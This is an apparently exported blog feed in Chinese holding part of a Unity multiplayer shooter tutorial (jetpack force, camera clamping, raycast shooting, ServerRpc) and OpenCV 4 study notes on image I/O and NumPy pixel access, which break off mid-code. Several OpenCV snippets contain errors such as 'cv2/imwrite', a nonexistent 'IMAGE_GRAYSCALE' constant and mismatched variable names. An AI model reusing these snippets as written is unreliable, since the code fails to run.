<span class="token punctuation">(</span>Input<span class="token punctuation">.</span><span class="token function">GetButton</span><span class="token punctuation">(</span><span class="token string">"Jump"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//获取到空格键</span>        <span class="token punctuation">{</span>            force <span class="token operator">=</span> Vector3<span class="token punctuation">.</span>up <span class="token operator">*</span> thrusterForce<span class="token punctuation">;</span><span class="token comment">//向上的分量获得推力</span>            joint<span class="token punctuation">.</span>yDrive <span class="token operator">=</span> <span class="token keyword">new</span> JointDrive<span class="token comment">//为整个Configurable Joint结构体赋值</span>            <span class="token punctuation">{</span>                positionSpring <span class="token operator">=</span> <span class="token number">0f</span><span class="token punctuation">,</span>                positionDamper <span class="token operator">=</span> <span class="token number">0f</span><span class="token punctuation">,</span>                maximumForce <span class="token operator">=</span> <span class="token number">0f</span><span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token comment">//松开空格，恢复弹力</span>        <span class="token punctuation">{</span>            joint<span class="token punctuation">.</span>yDrive <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">JointDrive</span>            <span class="token punctuation">{</span>                positionSpring <span class="token operator">=</span> <span class="token number">20f</span><span class="token punctuation">,</span>                positionDamper <span class="token operator">=</span> <span class="token number">0f</span><span class="token punctuation">,</span>                maximumForce <span class="token operator">=</span> <span class="token number">40f</span><span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        controller<span class="token punctuation">.</span><span class="token function">Thrust</span><span class="token punctuation">(</span>force<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将弹力传递到controller类</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>获取 Configurable Joint 组件。这里获取可以采用 SerializeField ，也可以在 Start() 函数中使用 joint = GetComponent<configurablejoint>();</configurablejoint></li><li>获取GetComponent 会在当前物体中寻找组件，找不到会报错，有多个会随机选一个</li><li>在按下空格时将 Configurable Joint 的 yDrive 变为0，松开空格时变回原值</li></ul><h3 id="限制一下视角角度-视角不能上下360旋转"><a href="#限制一下视角角度-视角不能上下360旋转" class="headerlink" title="限制一下视角角度(视角不能上下360旋转)"></a>限制一下视角角度(视角不能上下360旋转)</h3><p>限制一下角色向上和向下看的角度。在 PlayerController 中实现</p><ul><li>新建一个变量记录摄像头在x轴上转到了多少角度</li><li>将该角度限制在一个范围中：Mathf.Clamp(cameraRotationTotal, -cameraRotationLimit, cameraRotationLimit); , 限制在了 [-cameraRotationLimit, cameraRotationLimit] 中</li><li>将旋转角度直接赋值给物体的 transform : cam.transform.localEulerAngles = new Vector3(cameraRotationTotal, 0f, 0f);</li></ul><p>cam.transform.localEulerAngles和cam.transform.Rotate;区别:<br>localEulerAngles 直接设置对象的局部欧拉角旋转，而 Rotate 方法对当前旋转进行增量旋转。<br>使用 localEulerAngles 可能更直观和简单，特别是当你只想设置对象的特定旋转角度时。<br>使用 Rotate 方法可以更灵活地处理增量旋转，对于动态或交互性的旋转效果更为方便。</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">if</span> <span class="token punctuation">(</span>xRotation <span class="token operator">!=</span> Vector3<span class="token punctuation">.</span>zero<span class="token punctuation">)</span>       <span class="token punctuation">{</span>          cameraRotationTotal <span class="token operator">+=</span> xRotation<span class="token punctuation">.</span>x<span class="token punctuation">;</span> <span class="token comment">//向量的 x 分量</span>  cameraRotationTotal <span class="token operator">=</span> Mathf<span class="token punctuation">.</span><span class="token function">Clamp</span><span class="token punctuation">(</span>cameraRotationTotal<span class="token punctuation">,</span> <span class="token operator">-</span>cameraRotationLimit<span class="token punctuation">,</span> cameraRotationLimit<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Mathf.Clamp 方法将 cameraRotationTotal 限制在 -cameraRotationLimit 和 cameraRotationLimit 之间</span>  cam<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>localEulerAngles <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Vector3</span><span class="token punctuation">(</span>cameraRotationTotal<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实现射击"><a href="#实现射击" class="headerlink" title="实现射击"></a>实现射击</h2><p>在 Player 中添加脚本 PlayerShooting.cs</p><p>1、在 Update() 中获取用户输入 （鼠标左键射击，名字是 Fire1。）这里 ctrl 也会触发射击，但未来我们会用 ctrl 做下蹲，所以删掉</p><p><img src="/2023/11/22/unity-xue-xi-shi-xian-fei-xing-he-she-ji/image-20231123005250602.png"></p><p><img src="/2023/11/22/unity-xue-xi-shi-xian-fei-xing-he-she-ji/124908_0c8141d92e-fire1.png"></p><p>这里先设定枪为半自动，鼠标左键按下后只发出一发子弹</p><p>2、实现一个射击函数 Shoot() ，每按下左键就开始射击</p><h3 id="射击函数编写"><a href="#射击函数编写" class="headerlink" title="射击函数编写"></a>射击函数编写</h3><p>射击涉及的属性：伤害值、射击距离、枪械名称。这些属性归属于同一把枪，我们希望这些属性可以放在一起管理，因此我们创建一个脚本 PlayerWeapon.cs</p><h4 id="武器管理"><a href="#武器管理" class="headerlink" title="武器管理"></a>武器管理</h4><p>PlayerWeapon 是一个普通的类，不需要继承基类 MonoBehaviour 。类中包含以下三个属性</p><ul><li>武器名称</li><li>伤害值</li><li>射程</li></ul><p>为了能在unity编辑器中编辑类的属性值，在类上添加注解 [Serializable] ，并将属性变为 public</p><p>回到 PlayerShooting 中，加入 PlayerWeapon 类，添加 [SerializeField] ，这时可以在右边看到武器属性</p><h4 id="射击逻辑"><a href="#射击逻辑" class="headerlink" title="射击逻辑"></a>射击逻辑</h4><p>这里设定游戏的射击逻辑为从玩家摄像头（未来会是准心）发出一条射程长度的线，线上的物体被判定为击中。</p><p>实现逻辑：</p><ul><li>获取摄像头位置</li><li>由于摄像头在 Player 的子组件里，因此需要用 GetComponentInChildren</li><li>调用unity封装好的函数，从摄像头位置发出一个射线，射线会返回第一个碰到的物体</li><li>由于游戏中不开启友伤时队友和敌人需要区分，因此可以加一个额外参数 mask ，射线会返回击中的第一个 mask 层的物体。未来队友和敌人也会分层，以此来区分。目前还没有添加敌友，因此 mask 选择 Everything</li></ul><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">private</span> <span class="token class-name">Camera</span> cam<span class="token punctuation">;</span> <span class="token comment">//角色摄像头</span><span class="token comment">// Start is called before the first frame update</span><span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cam <span class="token operator">=</span> <span class="token generic-method"><span class="token function">GetComponentInChildren</span><span class="token generic class-name"><span class="token punctuation">&lt;</span>Camera<span class="token punctuation">&gt;</span></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//与GetComponent&lt;&gt;()相比，这个还可以获取子对象的组件</span><span class="token punctuation">}</span><span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Update</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>Input<span class="token punctuation">.</span><span class="token function">GetButtonDown</span><span class="token punctuation">(</span><span class="token string">"Fire1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">Shoot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Shoot</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token class-name">RaycastHit</span> hit<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>Physics<span class="token punctuation">.</span><span class="token function">Raycast</span><span class="token punctuation">(</span>cam<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>position<span class="token punctuation">,</span> cam<span class="token punctuation">.</span>transform<span class="token punctuation">.</span>forward<span class="token punctuation">,</span> <span class="token keyword">out</span> hit<span class="token punctuation">,</span> weapon<span class="token punctuation">.</span>range<span class="token punctuation">,</span> mask<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">ShootServerRpc</span><span class="token punctuation">(</span>hit<span class="token punctuation">.</span>collider<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">ServerRpc</span></span><span class="token punctuation">]</span>    <span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">ShootServerRpc</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> hittedName<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        GameManager<span class="token punctuation">.</span><span class="token function">UpdateInfo</span><span class="token punctuation">(</span>transform<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">" hit "</span> <span class="token operator">+</span> hittedName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>代码中的 <code>Input.GetButtonDown("Fire1")</code> 是用于检测是否按下了名为 “Fire1” 的输入按钮（通常是鼠标左键或触摸屏幕）。在 <code>Update()</code> 函数中，如果检测到按下了该按钮，将调用 <code>Shoot()</code> 方法。</li><li><code>Shoot()</code> 方法中的 <code>Physics.Raycast()</code> 用于发射一条射线，从摄像机（cam）的位置沿着摄像机的前方方向，并检测是否与指定的图层（mask）上的物体发生了碰撞。如果射线与物体发生了碰撞，将触发 <code>ShootServerRpc()</code> 方法，并将碰撞到的物体的名称作为参数传递给该方法。</li><li><code>ShootServerRpc()</code> 方法被标记为 <code>[ServerRpc]</code>，这表示它是一个服务器远程过程调用方法。该方法会向服务器发送一条消息，通知服务器发生了射击，并传递了被击中物体的名称。</li><li>在 <code>ShootServerRpc()</code> 方法中，调用了 <code>GameManager.UpdateInfo()</code> 方法，并将发射射线的物体的名称和被击中物体的名称作为参数传递给该方法。这里假设 <code>GameManager</code> 是一个游戏管理器类的实例，<code>UpdateInfo()</code> 方法用于更新游戏中的信息。</li></ol><p><img src="/2023/11/22/unity-xue-xi-shi-xian-fei-xing-he-she-ji/image-20231124005021341.png"></p><h2 id="给-Player-赋名字"><a href="#给-Player-赋名字" class="headerlink" title="给 Player 赋名字"></a>给 Player 赋名字</h2><p>不同 Player 需要有一个不同的名字，方便以后调试。这里使用下面的代码赋值：</p><p>transform.name = “Player “ + GetComponent<networkobject>().NetworkObjectId; : transform.name 是物体的名字，GetComponent<networkobject>().NetworkObjectId 是调用标识网络物体的 NetworkObject 的API，它会将联机的所有玩家从1开始编号，保证所有玩家的名字在所有对局窗口中都相同</networkobject></networkobject></p><p>在PlayerSetup.cs中添加下列代码：</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token comment">//..</span><span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//...</span>    <span class="token function">SetPlayerName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//.....</span><span class="token comment">//.....</span><span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">SetPlayerName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    transform<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"Player"</span> <span class="token operator">+</span> <span class="token generic-method"><span class="token function">GetComponent</span><span class="token generic class-name"><span class="token punctuation">&lt;</span>NetworkObject<span class="token punctuation">&gt;</span></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>NetworkObjectId<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="联机射击通信"><a href="#联机射击通信" class="headerlink" title="联机射击通信"></a>联机射击通信</h2><p>如何让一个玩家的射击行为显示在所有玩家的对局中？按照我们上一次讲的Client模式，玩家射击后，将射击信息传递给Server，Server广播给其他所有玩家。</p><p>要实现这一个模式，需要用到<a href="https://docs-multiplayer.unity3d.com/netcode/current/advanced-topics/message-system/serverrpc/index.html">ServerRpc</a>，这个注解的作用是将函数发送到Server端执行，因此这个发送到Server端的函数可以起到传递信息的作用</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token punctuation">[</span><span class="token attribute"><span class="token class-name">ServerRpc</span></span><span class="token punctuation">]</span><span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">Shoot2ServerRpc</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> hittedname<span class="token punctuation">)</span><span class="token punctuation">{</span>Debug<span class="token punctuation">.</span><span class="token function">Log</span><span class="token punctuation">(</span>transform<span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">"hit"</span> <span class="token operator">+</span> hittedname<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要注意的是在server端（也有所有的代码）没有本地用户这一概念，也就是说shootServerRpc等都被禁用掉了，也就执行了,这就产生了矛盾，此时我们可以换一种理解方式，就是相当于用户将这个代码发送给服务端，让服务端来帮忙运那些代码</p><p>要使用该注解，需要注意以下几点</p><p>1、发送到Server端的函数一定要以 ServerRpc 结尾<br>2、函数所在的类一定要继承 NetworkBehaviour ，因为这是一个网络行为<br>3、这里在 Shoot() 函数中，击中并返回物体后，将后续的处理放进 ShootServerRpc() 中并调用。</p><p>在射击行为中，会出现一个上次编写联机出现过的问题：本地玩家可以操控联机的玩家，因为所有角色都会从本地（所有主机）读取用户操作，因此要把 PlayerShooting 组件disable掉</p><h2 id="在游戏画面中输出信息"><a href="#在游戏画面中输出信息" class="headerlink" title="在游戏画面中输出信息"></a>在游戏画面中输出信息</h2><p>在 Scene 中创建一个空物体 GameManager , 为 GameManager 添加一个脚本 GameManager.cs，脚本代码见文章下方</p>]]></content>
      
      
      <categories>
          
          <category> Unity </category>
          
          <category> Project_practice </category>
          
          <category> Game_dev </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unity </tag>
            
            <tag> Game_dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenCV 4 learning notes</title>
      <link href="/2023/11/20/opencv-4-learning-notes/"/>
      <url>/2023/11/20/opencv-4-learning-notes/</url>
      
        <content type="html"><![CDATA[<h2 id="处理文件、摄像头和GUI"><a href="#处理文件、摄像头和GUI" class="headerlink" title="处理文件、摄像头和GUI"></a>处理文件、摄像头和GUI</h2><h3 id="读取-x2F-写入图像文件"><a href="#读取-x2F-写入图像文件" class="headerlink" title="读取/写入图像文件"></a>读取/写入图像文件</h3><p>​图像可以从一种文件格式加载并保存为另一种格式。例如，把一 幅图像从PNG转换为JPEG</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> cv2image <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'xxx.png'</span><span class="token punctuation">)</span>cv2<span class="token operator">/</span>imwrite<span class="token punctuation">(</span><span class="token string">'xxx.jpg'</span><span class="token punctuation">,</span> image<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>默认情况下，imread返回BGR格式的图像，即使该文件使用的是灰度格式。BGR表示与红–绿–蓝（Red-Green-Blue，RGB）相同的颜色模型，只是字节顺序相反。 我们还可以指定imread的模式，所支持的选项包括：</p><ul><li>cv2.IMREAD_COLOR：该模式是默认选项，提供3通道的BGR图像，每个通道一个8位值（0～255）(dtype=uint8)。</li><li>cv2.IMREAD_GRAYSCALE：该模式提供8位灰度图像。</li><li>cv2.IMREAD_ANYCOLOR：该模式提供每个通道8位的BGR图像或者8位灰度图像，具体取决于文件中的元数据。</li><li>cv2.IMREAD_UNCHANGED：该模式读取所有的图像数据，包括作为第4通道的α或透明度通道（如果有的话）。</li><li>cv2.IMREAD_ANYDEPTH：该模式加载原始位深度的灰度图像。例如，如果文件以这种格式表示一幅图像，那么它提供每个通道16位的一幅灰度图像。</li><li>cv2.IMREAD_ANYDEPTH｜cv2.IMREAD_COLOR：该组合模式加载原始位深度的BGR彩色图像。</li><li>cv2.IMREAD_REDUCED_GRAYSCALE_2：该模式加载的灰度 图像的分辨率是原始分辨率的1/2。例如，如果文件包括一幅640×480 的图像，那么它加载的是一幅320×240的图像。</li><li>cv2.IMREAD_REDUCED_COLOR_2：该模式加载每个通道8位 的BGR彩色图像，分辨率是原始图像的1/2。</li><li>cv2.IMREAD_REDUCED_GRAYSCALE_4：该模式加载灰度图像，分辨率是原始图像的1/4。</li><li>cv2.IMREAD_REDUCED_COLOR_4：该模式加载每个通道8位的彩色图像，分辨率是原始图像的1/4。</li><li>cv2.IMREAD_REDUCED_GRAYSCALE_8：该模式加载灰度图像，分辨率是原始图像的1/8。</li><li>·cv2.IMREAD_REDUCED_COLOR_8：该模式加载每个通道8位的彩色图像，分辨率为原始图像的1/8。</li></ul><p>举个例子，我们将一个PNG文件加载为灰度图像（在此过程中会丢 失所有颜色信息），再将其保存为一个灰度PNG图像：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> cv2grayImage <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'xxx.png'</span><span class="token punctuation">,</span> cv2<span class="token punctuation">.</span>IMAGE_GRAYSCALE<span class="token punctuation">)</span>cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string">'xxx.png'</span><span class="token punctuation">,</span> grayImage<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>imwrite()函数要求图像为BGR格式或者灰度格式，每个通道具有输出格式可以支持的特定位数。例如，BMP文件格式要求每个通道8位，而PNG允许每个通道8位或16位。</p><h3 id="在图像和原始字节之间进行转换"><a href="#在图像和原始字节之间进行转换" class="headerlink" title="在图像和原始字节之间进行转换"></a>在图像和原始字节之间进行转换</h3><p>​从概念上讲，一个字节就是0～255范围内的一个整数。目前，在实时图形应用程序中，像素通常由每个通道一个字节来表示，但是也可以使用其他表示方式。</p><p>​OpenCV图像是numpy.array类型的二维或者三维数组。8位灰度图像是包含字节值的一个二维数组。24位的BGR图像是一个三维数组，也包含字节值。我们可以通过使用类似于image[0,0]或者image[0,0,0] 的表达式来访问这些值。第一个索引是像素的y坐标或者行，0表示顶部。第二个索引是像素的x坐标或者列，0表示最左边。第三个索引（如果有的话）表示一个颜色通道。可以用下面的笛卡儿坐标系可视化数组的三维空间。</p><p><img src="/2023/11/20/opencv-4-learning-notes/image-20231120184508768.png"></p><p>​例如，在左上角为白色像素的8位灰度图像中，image[0,0]是255。在左上角为蓝色像素的24位（每个通道8位）BGR图像中，image[0,0]是[255,0,0]。</p><p>假设图像的每个通道有8位，我们可以将其强制转换为标准的 Python bytearray对象（一维的）：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">byteArray <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>image<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>相反，假设bytearray以一种合适的顺序包含字节，我们对其进行 强制转换后再将其变维，可以得到一幅numpy.array类型的图像：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">grayImage <span class="token operator">=</span> numpy<span class="token punctuation">.</span>array<span class="token punctuation">(</span>grayByteArray<span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span>height<span class="token punctuation">,</span> weight<span class="token punctuation">)</span>bgrImage <span class="token operator">=</span> numpy<span class="token punctuation">.</span>array<span class="token punctuation">(</span>bgrByteArray<span class="token punctuation">)</span><span class="token punctuation">.</span>reshape<span class="token punctuation">(</span>height<span class="token punctuation">,</span> weight<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>举个更完整的例子，我们将包含随机字节的bytearray转换为灰度 图像和BGR图像：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> cv2<span class="token keyword">import</span> numpy<span class="token keyword">import</span> os<span class="token comment"># make an array of 120,000 random bytes.</span>randoByteArray <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">120000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flatNumpyArray <span class="token operator">=</span> numpy<span class="token punctuation">.</span>array<span class="token punctuation">(</span>randomByteArray<span class="token punctuation">)</span><span class="token comment"># convert the array to make a 400x300 grascale image</span>grayImage <span class="token operator">=</span> flatNumpyArray<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span>cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string">'xxx.png'</span><span class="token punctuation">,</span> grayImage<span class="token punctuation">)</span><span class="token comment"># convert the array to make a 400x100 color image</span>bgrImage <span class="token operator">=</span> flatNumpyArray<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span><span class="token string">'xxx.png'</span><span class="token punctuation">,</span> bgrImage<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处，我们使用Python的标准os.urandom函数生成随机的原始字节序列，bytearray()组成字节数组，然后再将其转换成NumPy数组。。请注意，也可以使用像 numpy.random.randint(0,256,120000).reshape(300,400)这样的语句直接（而且更有效）生成随机NumPy数组。我们使用os.urandom的唯一原因是： 这有助于展示原始字节的转换。</p><p>注目：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> osrandom_bytes <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">12000</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>random_bytes<span class="token punctuation">)</span><span class="token comment"># the result of output is like</span><span class="token comment"># b'\x9e\xfa\x85\x88\xab\x1e\x1a\xdb\xe4\x0c\x8f...'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于 <code>numpy.random.randint(0, 256, 120000)</code> 这个代码，生成的数组维度是 <code>(120000,)</code>，即一个一维数组，包含 120,000 个元素。</p><p>在 NumPy 中，生成的随机数组的维度由传递给 <code>numpy.random.randint()</code> 函数的参数决定。第一个参数是随机数的最小值（包含），第二个参数是随机数的最大值（不包含），第三个参数是生成的随机数的数量。</p><p>在这个例子中，我们传递了参数 <code>(0, 256, 120000)</code>，因此生成了一个包含 120,000 个随机整数的一维数组。每个随机整数的取值范围是 0 到 255（包含 0 和 255）。</p><p>请注意，如果我们在 <code>numpy.random.randint()</code> 中传递了其他维度参数，例如 <code>(0, 256, (100, 200))</code>，则会生成一个具有 <code>(100, 200)</code> 维度的二维数组，其中包含随机整数。根据需要，您可以调整维度参数来生成不同形状的随机数组。</p><h3 id="基于numpy-array访问图像数据"><a href="#基于numpy-array访问图像数据" class="headerlink" title="基于numpy.array访问图像数据"></a>基于numpy.array访问图像数据</h3><p>​我们已经知道在OpenCV中加载图像最简单（也是最常见）的方法是使用imread函数。我们还知道这将返回一幅图像，它实际上是一个数组（是二维还是三维取决于传递给imread的参数）。</p><p>​numpy.array类对数组操作进行极大的优化，它允许某些类型的批量操作，而这些操作在普通Python列表中是不可用的。这些类型的numpy.array都是OpenCV中特定于数组类型的操作，对于图像操作来说很方便。但是，我们还是从一个基本的例子开始，逐步探讨图像操作。假设你想操作BGR图像的（0,0）坐标处的像素，并将其转换成白色像素：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> cv2img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'xx.png'</span><span class="token punctuation">)</span>img<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​如果将修改后的图像保存到文件后再查看该图像，你会在图像的左上角看到一个白点。当然，这种修改并不是很有用，但是它显示了某种修改的可能性。现在，我们利用numpy.array的功能在数组上执行变换的速度比普通的Python列表要快得多。</p><p>​假设你想更改某一特定像素的蓝色值，例如（150,120）坐标处的像素。numpy.array类型提供了一个方便的方法item，它有三个参数：x（或者left）位置、y（或者top）位置以及数组中（x,y）位置的索引（请记住，在BGR图像中，某个特定位置处的数据是一个三元数组， 包含按照B、G和R顺序排列的值），并返回索引位置的值。另一个方法 itemset可以将某一特定像素的特定通道的值设置为指定的值。 itemset有两个参数：三元组（x、y和索引）以及新值。</p><p>​在下面的例子中，我们将（150,120）处的蓝色通道值从其当前值 更改为255：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> cv2img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'xx.png'</span><span class="token punctuation">)</span>img<span class="token punctuation">.</span>itemset<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span> <span class="token comment"># sets the value of a pi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​对于修改数组中的单个元素，itemset方法比我们在本节第一个例子中看到的索引语法要快一些。</p><p>​同样，修改数组的一个元素本身并没有太大意义，但是它确实打开了一个充满可能性的世界。然而，就性能而言，这只适合于感兴趣的小区域。当需要操作整个图像或者感兴趣的大区域时，建议使用 OpenCV的函数或者NumPy的数组切片。NumPy的数组切片允许指定索引的范围。我们来考虑使用数组切片来操作颜色通道的一个例子。将一 幅图像的所有G（绿色）值都设置为0非常简单，如下面的代码所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> cv2im <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'xx.png'</span><span class="token punctuation">)</span>img<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​这段代码执行了一个相当重要的操作，而且很容易理解。相关的代码行是最后一行，它指示程序从所有行和列中获取所有像素，并把绿色值（在三元BGR数组的一个索引处）设置为0。如果显示此图像， 你会注意到绿色完全消失了。</p><p>​通过使用NumPy的数组切片访问原始像素，我们可以做一些有趣的事情，其中之一是定义感兴趣区域（Region Of Interest，ROI）。一 旦定义了感兴趣区域，就可以执行一系列的操作了。例如，可以把这个区域绑定到一个变量，定义第二个区域，将第一个区域的值（感兴趣的区域的值my_roi）赋给第二个区域（从而将图像的一部分复制到图像的另一个位置）：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> cv2img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span><span class="token string">'xx.png'</span><span class="token punctuation">)</span>my_roi <span class="token operator">=</span> img<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token comment">#定义感兴趣区域</span>img<span class="token punctuation">[</span><span class="token number">300</span><span class="token punctuation">:</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">:</span><span class="token number">400</span><span class="token 